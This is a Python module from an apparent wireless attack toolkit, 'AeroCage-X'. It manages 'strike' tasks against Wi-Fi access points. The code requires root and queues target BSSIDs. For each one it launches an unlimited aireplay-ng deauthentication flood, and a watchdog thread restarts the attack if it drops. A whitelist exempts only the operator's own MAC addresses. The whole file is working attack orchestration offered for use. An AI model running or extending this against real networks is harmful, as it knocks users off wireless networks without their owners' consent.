#!/usr/bin/env python3
"""
File Name: strike_manager.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_manager.py
Created Date: 2026-05-25
Version: 1.0.1
Description: Core Task Scheduling and Execution Manager for AeroCage-X.
             Integrates automated whitelist validation and task watchdog threads.
"""

import sys
import threading
from pathlib import Path

# ربط المسارات بالنواة المركزية والأنظمة المساعدة للمنظومة
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))

# pylint: disable=import-error, wrong-import-position, no-name-in-module
from core.system_guard import SystemGuard
from core.process_manager import ProcessManager
from modules.strike_whitelist import StrikeWhitelistEngine
from modules.strike_watchdog import StrikeWatchdogEngine


class StrikeManagerEngine:
    """
    Main Strike Task Controller.
    Manages centralized execution arrays, target queues, and task recovery.
    """

    def __init__(self):
        """تهيئة محرك الإدارة والتحقق من الصلاحيات وتفعيل خيط الحراسة المجدول"""
        # تفعيل صلاحيات الـ Root محلياً عند الاستدعاء
        SystemGuard.enforce_root_privileges("Strike Manager Engine")

        self.proc_manager = ProcessManager()
        self.whitelist_engine = StrikeWhitelistEngine()
        self.watchdog_engine = StrikeWatchdogEngine()
        self.lock = threading.Lock()
        self.active_attack_queue = set()

        # تشغيل محرك الحراسة التلقائي (Watchdog) لمراقبة استقرار المهام
        self.watchdog_engine.start_watchdog_loop_async(check_interval_sec=5)

    def queue_and_launch_strike_safe(self, interface: str, target_bssid: str) -> bool:
        """جدولة وتلقيم وإطلاق مهام المراقبة والفصل اللاسلكي بأمان مصفوفة كامل"""
        clean_inf = SystemGuard.sanitize_input(interface, "interface")
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        if not clean_inf or not clean_mac:
            print("[-] Configuration Error: Invalid queue target parameters detected.")
            return False

        # التحقق الاستباقي من القائمة البيضاء لحماية الأصول اللاسلكية المعزولة
        if self.whitelist_engine.is_target_whitelisted(clean_mac):
            # تقسيم السطر للتوافق الصارم مع معايير طول السطر لـ PEP 8 لـ Pylint
            print(f"[🛡️ Protected] Execution aborted. MAC [{clean_mac}] is whitelisted!")
            return False

        with self.lock:
            if clean_mac in self.active_attack_queue:
                print(f"[-] System Notice: Target [{clean_mac}] is already in queue.")
                return False
            self.active_attack_queue.add(clean_mac)

        # بناء الأمر الآمن بالصيغة القياسية المعزولة الشل تماماً لـ Bandit
        command_array = ["aireplay-ng", "0", "0", "-a", clean_mac, clean_inf]

        try:
            print(f"[*] Queueing task handles against wireless host: {clean_mac}")

            # إطلاق المهمة عبر المدير لتفريغ البافر اللحظي وحماية موارد المعالج
            process = self.proc_manager.spawn_process_safe(clean_mac, command_array)

            if process:
                # تلقيم المعاملات لمحرك الحراسة للمتابعة والإنعاش الآلي عند الانقطاع
                self.watchdog_engine.register_target_for_monitoring(
                    clean_inf, clean_mac, command_array
                )
                return True

            with self.lock:
                self.active_attack_queue.discard(clean_mac)

        except (RuntimeError, AttributeError, OSError) as e:
            print(f"[-] Integrity Error: Unexpected crash during task queue dispatch: {e}")
            with self.lock:
                self.active_attack_queue.discard(clean_mac)
        return False

    def abort_target_strike(self, target_bssid: str):
        """إيقاف المهمة الموجهة وإلغاء حراستها وتطهير الذاكرة دون تداخل"""
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        with self.lock:
            if clean_mac in self.active_attack_queue:
                self.active_attack_queue.discard(clean_mac)

        # سحب وتصفير المعرفات من كائن الحراسة وإخماد العملية من لينكس بدقة
        self.watchdog_engine.unregister_and_stop_target(clean_mac)
        print(f"[+] Task successfully cleared for target node: [{clean_mac}]")

    def shutdown_all_strikes(self):
        """إخماد كلي وشامل لكافة المهام وتفكيك طابور العمليات وتنظيف بيئة النظام"""
        print("\n[*] Initiating global shutdown sequence across active pipelines...")
        self.watchdog_engine.stop_watchdog_completely()

        with self.lock:
            for mac in list(self.active_attack_queue):
                self.proc_manager.terminate_process(mac)
            self.active_attack_queue.clear()
        print("[+] Global clean-up sequence completed. All tracking registers flushed cleanly.")


if __name__ == "__main__":
    print("[+] Strike Manager Engine module deployment configuration verified.")
